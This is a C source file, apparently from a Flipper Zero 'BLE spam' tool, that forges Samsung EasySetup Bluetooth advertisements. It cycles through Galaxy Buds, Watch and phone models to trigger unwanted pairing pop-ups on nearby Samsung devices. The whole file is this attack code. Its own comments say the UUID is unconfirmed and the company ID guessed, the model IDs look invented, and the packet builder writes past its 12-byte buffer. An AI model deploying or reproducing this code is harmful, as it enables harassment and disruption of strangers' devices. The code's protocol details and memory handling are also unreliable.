#include "ble_spam.h"
#include <furi_hal_random.h>
#include <string.h>

// =============================================================================
// Samsung EasySetup 協議
// =============================================================================
// Samsung 設備使用專有的 EasySetup 協議進行快速配對
// 主要用於:
// - Galaxy Buds 系列
// - Galaxy Watch 系列
// - Samsung SmartThings 生態系統
//
// EasySetup 使用特定的 GATT Service UUID
// 觸發 Samsung 設備上的「快速設定」彈窗
//
// 參考: Samsung Galaxy Wearable app 逆向工程
// =============================================================================

// =============================================================================
// EasySetup 設備列表
// =============================================================================
static const struct {
    uint32_t model_id;
    const char* name;
    const char* type;
} g_easysetup_devices[] = {
    // Galaxy Buds
    {0x0001, "Galaxy Buds2 Pro", "Buds"},
    {0x0002, "Galaxy Buds2", "Buds"},
    {0x0003, "Galaxy Buds Pro", "Buds"},
    {0x0004, "Galaxy Buds Live", "Buds"},
    {0x0005, "Galaxy Buds+", "Buds"},
    {0x0006, "Galaxy Buds", "Buds"},
    {0x0007, "Galaxy Buds FE", "Buds"},
    
    // Galaxy Watch
    {0x0010, "Galaxy Watch6 44mm", "Watch"},
    {0x0011, "Galaxy Watch6 40mm", "Watch"},
    {0x0012, "Galaxy Watch6 Classic 43mm", "Watch"},
    {0x0013, "Galaxy Watch6 Classic 47mm", "Watch"},
    {0x0020, "Galaxy Watch5 44mm", "Watch"},
    {0x0021, "Galaxy Watch5 40mm", "Watch"},
    {0x0022, "Galaxy Watch5 Pro 45mm", "Watch"},
    {0x0030, "Galaxy Watch4 40mm", "Watch"},
    {0x0031, "Galaxy Watch4 44mm", "Watch"},
    {0x0032, "Galaxy Watch4 Classic 42mm", "Watch"},
    {0x0033, "Galaxy Watch4 Classic 46mm", "Watch"},
    
    // Galaxy Phones (部分型號支援快速分享)
    {0x0100, "Galaxy S24 Ultra", "Phone"},
    {0x0101, "Galaxy S24+", "Phone"},
    {0x0102, "Galaxy S24", "Phone"},
    {0x0110, "Galaxy S23 Ultra", "Phone"},
    {0x0111, "Galaxy S23+", "Phone"},
    {0x0112, "Galaxy S23", "Phone"},
    {0x0120, "Galaxy Z Fold5", "Phone"},
    {0x0121, "Galaxy Z Flip5", "Phone"},
    {0x0130, "Galaxy A54 5G", "Phone"},
    {0x0131, "Galaxy A34 5G", "Phone"},
};

// =============================================================================
// EasySetup BLE 廣播格式
// =============================================================================
// EasySetup 使用特定的 Service UUID 進行廣播
// Service UUID: 0xFE58 (待確認)
// 
// AD Structure:
//   [Len] [Type=0x03] [UUID=0x58 0xFE] [Model Data...]
// 
// 或使用 Manufacturer Data:
//   [Len] [Type=0xFF] [Company=0x00 0x00] [ModelHi] [ModelLo] [Type]...
// =============================================================================

static uint8_t easysetup_build_packet(uint8_t* _size, uint8_t** _packet, AttackConfig* config) {
    EasysetupCfg* cfg = &config->config.easysetup;
    
    // 選擇設備
    uint8_t device_idx;
    if(config->mode == AttackMode_Random || config->mode == AttackMode_Single) {
        device_idx = rand() % (sizeof(g_easysetup_devices) / sizeof(g_easysetup_devices[0]));
    } else {
        device_idx = cfg->model;
    }
    
    uint32_t model_id = g_easysetup_devices[device_idx].model_id;
    const char* device_type = g_easysetup_devices[device_idx].type;
    
    // 構建數據包 - 使用 Service UUID 方式
    // 格式: Flags + Service UUID + Service Data
    uint8_t total_size = 3 + 3 + 6;  // 預留大小
    uint8_t* packet = malloc(total_size);
    uint8_t i = 0;
    
    // Flags
    packet[i++] = 0x02;  // Length
    packet[i++] = 0x01;  // AD Type: Flags
    packet[i++] = 0x06;  // Flags (General Discoverable)
    
    // Service UUID
    packet[i++] = 0x03;  // Length
    packet[i++] = 0x03;  // AD Type: Service UUID
    packet[i++] = 0x58;  // UUID low (0xFE58)
    packet[i++] = 0xFE;  // UUID high
    
    // Service Data
    packet[i++] = 0x06;  // Length
    packet[i++] = 0x16;  // AD Type: Service Data
    packet[i++] = 0x58;  // UUID low
    packet[i++] = 0xFE;  // UUID high
    packet[i++] = (model_id >> 0) & 0xFF;   // Model byte 0
    packet[i++] = (model_id >> 8) & 0xFF;   // Model byte 1
    packet[i++] = 0x00;  // Reserved
    packet[i++] = 0x00;  // Reserved
    
    // 如果是 Watch 類型，添加額外的 Manufacturer Data
    if(strcmp(device_type, "Watch") == 0) {
        // 重新分配更大的緩衝區
        uint8_t* new_packet = realloc(packet, i + 8);
        if(new_packet) {
            packet = new_packet;
            // Samsung Watch 特定的 Manufacturer Data
            packet[i++] = 0x07;  // Length
            packet[i++] = 0xFF;  // AD Type: Manufacturer Specific
            packet[i++] = 0x00;  // Samsung Company ID (猜測)
            packet[i++] = 0x00;
            packet[i++] = (model_id >> 0) & 0xFF;
            packet[i++] = (model_id >> 8) & 0xFF;
            packet[i++] = 0x01;  // Watch type indicator
            packet[i++] = rand() % 256;  // Random data
        }
    }
    
    *_size = i;
    *_packet = packet;
    return i;
}

// =============================================================================
// 獲取設備名稱
// =============================================================================
static const char* easysetup_get_name(uint32_t index) {
    if(index >= sizeof(g_easysetup_devices) / sizeof(g_easysetup_devices[0])) {
        return "Unknown";
    }
    return g_easysetup_devices[index].name;
}

static uint32_t easysetup_get_count(void) {
    return sizeof(g_easysetup_devices) / sizeof(g_easysetup_devices[0]);
}

// =============================================================================
// 協議驅動
// =============================================================================
const ProtocolDriver g_protocol_easysetup = {
    .name = "Samsung EasySetup",
    .short_name = "Samsung",
    .is_active = true,
    .build_packet = easysetup_build_packet,
    .get_device_name = easysetup_get_name,
    .get_device_count = easysetup_get_count,
    .init = NULL,
    .deinit = NULL,
};